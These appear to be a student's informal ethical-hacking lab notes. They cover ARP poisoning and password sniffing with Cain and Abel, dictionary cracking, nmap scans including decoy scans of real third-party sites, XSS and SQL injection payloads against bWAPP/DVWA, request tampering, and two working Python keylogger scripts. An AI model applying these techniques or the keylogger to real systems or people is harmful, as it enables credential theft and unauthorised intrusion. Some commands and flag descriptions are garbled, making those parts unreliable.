EH all steps

###################### Use Google and Whois for Reconnaisasance
-Visit who.is website
-Input the ""www.google.com"" in the input box and click on the search button
-Show your information about www.google.com

- shodon.io --- insert ip add

-( to find ip address = comand prompt write nslookup www.amazon.com )



###################### Use CryptTool to encrypt and decrypt passwords using RC4 algorithm.
use CrypTool 
- file--new --Type something in the black document
-Then click on Encrypt/Decrypt tab > Symmetric (modern) > RC4
-Then set the key length to 24 bits and click on  encrypt
-Now again repeat step2 and step 3. This time click on derypt option.- Now the text again decrypt from RC4 encrypted format.





?????????????############################ Use Cain and Abel for cracking Windows account password using Dictionary attack and to decode wireless network passwords

run cain and able as administrator---yes	
Click on Cracker in top tab
Click on HASH Calcuator on top.
Enter some number in text to hash----calculate---- copy MD5 hash
right click ----add to list ----and Paste the value into the field ----ok {e.g(MD5)}
Right Click on the hash and select the dictionary attack
Then right click on the file and select (Add to List) and then select the Wordlist 
right click and slect initial file positon
Select all the options and start the dictionary attack
if done click on exit





#############################  ARP Posioning
cain and able software

Step 1 : Select sniffer on the top.
Step 2 : Next to folder icon click on icon name start/stop sniffer. Select device and click on ok.
Step 3 : Click on  +  icon on the top. Click on ok.
Step 4 : Shows the Connected host.
Step 5 : Select Arp at bottom.
Step 6 : Click on  +  icon at the top---ok.
Step 7 : Click on start poisoning icon on top.
Step 8 : Poisoning the source.
Step 9 : Go to any website on source ip address.
Step 10 : Go to password option ----http in the cain & abel and see the passwords
step11: stop sniffer






###########################  Using TraceRoute, ping, ifconfig, netstat Command

COMMANDS:
-tracert www.google.com
-ping www.google.com
-ipconfig
-netstat

to stop  - Control + C




########################## Using Nmap scanner to perform port scanning of various forms – ACK, SYN, FIN, NULL, XMAS

in zenmap

Command —-nmap -sA  
             nmap-sF 
             nmap-sN 
             nmap-sV 
             nmap - sS

Target - scanme.nmap.org


COMMAND:
ACK -sA?(TCP ACK scan)
It never determines open (or even open|filtered) ports. It is used to mapout firewall rulesets, determining whether they are stateful or not andwhich ports are filtered.
Command: nmap -sA -T4 www.google.com

SYN (Stealth) Scan (-sS)
SYN scan is the default and most popular scan option for good reason. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by intrusive firewalls.
Command: nmap -p22,113,139 scanme.nmap.org
(we can show topology too!)

FIN Scan (-sF)
Sets just the TCP FIN bit.
Command: nmap -sF -T4 www.google.com

NULL Scan (-sN)
Does not set any bits (TCP flag header is 0)
Command: nmap  sN  p 22 www.google.com

XMAS Scan (-sX)
Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree.
Command: nmap -sX -T4 www.google.com

------------>>NMAP extra command

1.	Basic Scan: 
nmap www.mu.ac.in - Conducts a basic scan of the www.mu.ac.in, showing open ports and running services. 

2.	Intense Scan: 
nmap -T4 -A -v www.mu.ac.in - Performs an intense scan with version detection, OS detection, and traceroute to the www.mu.ac.in, using aggressive timing.

3.	Service Version Detection: 
nmap -sV www.mu.ac.in - Detects service versions running on open ports of the www.mu.ac.in. 

4.	Operating System Detection
nmap -O www.mu.ac.in - Attempts to identify the operating system running on the server hosting the www.mu.ac.in. 

5.	TCP SYN Scan: 
nmap -sS www.mu.ac.in - Conducts a TCP SYN scan of the www.mu.ac.in, often used for stealthy scanning. 

6.	UDP Scan: 
nmap -sU www.mu.ac.in - Conducts a UDP scan of the www.mu.ac.in, useful for discovering services running on UDP ports. 

7.	Aggressive Scan: 
nmap -T4 -A -v www.mu.ac.in - Conducts an aggressive scan with increased timing, version detection, and OS detection against the www.mu.ac.in. 

8.	Fast Scan: 
nmap -F www.mu.ac.in - Conducts a fast scan, scanning only the most common ports on the www.mu.ac.in. 

9.	Ping Scan: 
nmap -sn www.mu.ac.in - Conducts a ping scan of the www.mu.ac.in to determine if it's online.

10.	Port Range Scan: 
Nmap  p 1-100 www.mu.ac.in - Scans a specific range of ports (1 to 100) on the specified domain name. 

11.	Script Scan:
 nmap --script default www.mu.ac.in - Executes default scripts against open ports on the www.mu.ac.in. 

12.	Scan multiple targets: 
nmap www.mu.ac.in www.google.com - Scans multiple domain names simultaneously. 

13.	Scan for a specific port: 
nmap -p 80 www.mu.ac.in - Scans only port 80 on the www.mu.ac.in. 

14.	Scan for IPv6: 
nmap -6 www.mu.ac.in - Conducts a scan using IPv6 addressing on the www.mu.ac.in. 

15.	Scan using a specific interface: 
nmap -e interface_name www.mu.ac.in -  Specifies a network interface to use for the scan on the www.mu.ac.in. 

16.	Scan using a list of targets from a file: 
nmap -iL C:\Users\Admin\Documents\target.txt   Reads a list of domain names from a file and performs a scan on each of them. 

17.	Aggressive Timing Scan: 
nmap -T4 www.mu.ac.in - Conducts a scan with aggressive timing against the www.mu.ac.in. 

18.	Scan for common vulnerabilities: 
nmap --script vuln www.mu.ac.in - Executes vulnerability detection scripts against open ports on the www.mu.ac.in.

19.	Scan for SSL/TLS vulnerabilities: 
nmap --script ssl-enum-ciphers www.mu.ac.in - Identifies SSL/TLS vulnerabilities by enumerating supported ciphers on the www.mu.ac.in. 

20.	Scan using decoy IPs: 
nmap -D 192.0.78.1,192.168.24.7,www.mu.ac.in -  Conceals the identity of the scanning host by using fake IP addresses in the scan against the www.mu.ac.in




???????????################################ Use Wireshark sniffer to capture network traffic and analys

-select WIFI or ethernet (jispe zzzz lines hai)
-search "testlogin" in google--- acunetix website---- login using (test test)
- in wireshark search "http" and click on ""POST""
-below click on ""HTML form URL Encoded"---- you will see username and password.



?########################################## Cross Site Scripting
location: localhost/bwapp_latest/bWAPP/
(file —-bWAPP —-unzip in htdocs )

file —-bWAPP —-unzip in htdocs 

config.inc.php—open 

Connection setting me — change upar ka —save 

Run—— localhost/bWAPP/install.php 

Click here —successfully installed 

Login.php 

bee |bug 

Crosssite scripting(XSS)—- GET select 

Password —<script>alert(“hello”)</script>
-- 

1. Open bwapp and login username:bee and password:bug
2. Go to XSS   Reflected POST on top dropdown
3. Modify the input by inputting <h1>Hello</h1> in first name and last name
4. Now you got your output






########################################### Session impersonation using Chrome and Tamper Dev extension

Firefox —add ons— 

editthiscookie—search 
Add to Firefox 

Open an website — Extension — open —export —import —paste

———-

temperdata
(Cloud blue wala) —add extension 

Open —start tampering data —ok —stop tamper

---

-download "tamperdev" from crome extensions
-go to search "testlogin" in google--- acunetix website----
-click on tamper dev--- ON intercept request
-username:yourname and password:yourname  and login
-now go to tamper dev---request body ---- change to test and test---send----send---- cancel popup msg
-Then close the tamper dev the login will be unsuccessful






?##################################### SQL injection attack
1. Go to Bwapp and login
2. Select SQL Injection(get/search) option
3. Now select any option from it.
4. Result will be displayed
5. Now modify the url according to you. For example ?movie=40 union select 1,2,3,4,5,68#&action=go

---

DWVA —htdocs me put —config—.dist open —-full copy and paste in new notepad—save in the same location (config.inc.php)

Notepad — user =root 
      Pass —- keep empty 


Xamp— mysql —admin —new—create database —name —create

Import —choose file —- database—create_mysql_db.sql —click import 

Run ——localhost/dwva/login.php 

Change dabaae —click —login again —admin|password 

Devs security —low security 

SQL injection - add id






#############################keylogger
create a key_log.txt and import this code
pip install pynput


code:

from pynput.keyboard import Key, Listener 
import logging 
log_dir = "" 
logging.basicConfig(filename=(log_dir+"key_log.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)s:') 
def on_press(key): 
    logging.info(str(key)) 
with Listener(on_press=on_press) as listener: 
        listener.join()
type something and open key_log.txt. You will be see the key log recorded

To turn off the keylogger restart the terminal

####### code =
import pynput
from pynput.keyboard import Key,Listener

keys = []
def on_press(key):
  keys.append(key)
  write_file(keys)
  try:
    print('alphanumeric key{0} pressed'.format(key.char))

  except AttributeError:
    print('alphanumeric key {0} pressed'.format(key))

def write_file(keys):
  with open('log.txt','w') as f:
    for key in keys:
      k = str(key).replay("'","")
      f.write(k)
      f.write(' ')

def on_release(key):
  print('{0} released'.format(key))
  if key == Key.esc:
    return False

with Listener(on_press=on_press,on_release=on_release) as listener:
  listener.join()







WireShark extra command

1.	wireshark: This command launches the Wireshark GUI application.
 
2.	wireshark -r C:\Users\Admin\Documents\capture.pcapng: Opens a capture file for analysis in Wireshark.
 
3.	wireshark -D: Lists the available network interfaces that can be captured.
 
4.	wireshark -i wifi: Starts capturing packets on the specified network interface.
 
5.	wireshark -f "tcp port 80 or tcp port 443": Applies a capture filter to limit the types of packets captured.
  
6.	wireshark -Y tcp: Applies a display filter to limit the packets displayed in the GUI.
 
7.	wireshark  R tcp -r C:\Users\Admin\Documents\capture.pcapng: Reads a capture file and applies a read filter to display only packets matching the filter.
 
8.	wireshark -z wlan,stat: The command wireshark -z wsp,stat -r C:\Users\Admin\Documents\capture.pcapng is used to perform statistics calculations on captured packets related to the Wireless Session Protocol (WSP). WSP is a protocol used in wireless networks, particularly in the context of mobile communication systems such as GSM (Global System for Mobile Communications) and CDMA (Code Division Multiple Access).
 
9.	wireshark -c 10 -r C:\Users\Admin\Documents\capture.pcapng: Displays only the specified number of packets from the capture file.
 
10.	>wireshark -b duration:60 -b files:10: Sets a maximum capture file size and uses a ring buffer for continuous capture.
 
11.	wireshark -z wlanm,stat: This command performs Wi-Fi statistics analysis on captured packets and generates statistics related to Wi-Fi networks. It displays information such as Wi-Fi channel utilization, access point statistics, and signal strength.
 
12.	wireshark -h: Displays the command-line options and usage information for Wireshark.
 
13.	wireshark -X http -r C:\Users\Admin\Documents\capture.pcapng: Extracts and displays specific protocol details from the capture file.
 
14.	wireshark -t -n -r C:\Users\Admin\Documents\capture.pcapng: This command displays packet details without resolving addresses (IP, MAC, etc.) and timestamps them. It can be useful when you want to quickly analyze packet content without the overhead of address resolution.
 
15.	wireshark -z conv,tcp -r C:\Users\Admin\Documents\capture.pcapng: Performs TCP conversation analysis on the capture file.

16.	wireshark -z io,stat,1,tcp -r C:\Users\Admin\Documents\capture.pcapng: Generates input/output statistics for specified packets in the capture file.

17.	wireshark -z expert -r C:\Users\Admin\Documents\capture.pcapng: Displays the expert information, highlighting potential issues or anomalies in the captured packets.

18.	wireshark -z wlan,stat -r C:\Users\Admin\Documents\capture.pcapng: Generates HTTP statistics for packets captured in the file.

19.	wireshark -z sip,stat -r C:\Users\Admin\Documents\capture.pcapng: Generates Session Initiation Protocol (SIP) statistics from captured packets.

20.	wireshark  z ncp,stat -r C:\Users\Admin\Documents\capture.pcapng: The command wireshark -z ncp,srt -r C:\Users\Admin\Documents\capture.pcapng is used to analyze and generate statistics related to the service response times of NCP (NetWare Core Protocol) within the captured packets in the specified capture.pcapng file.
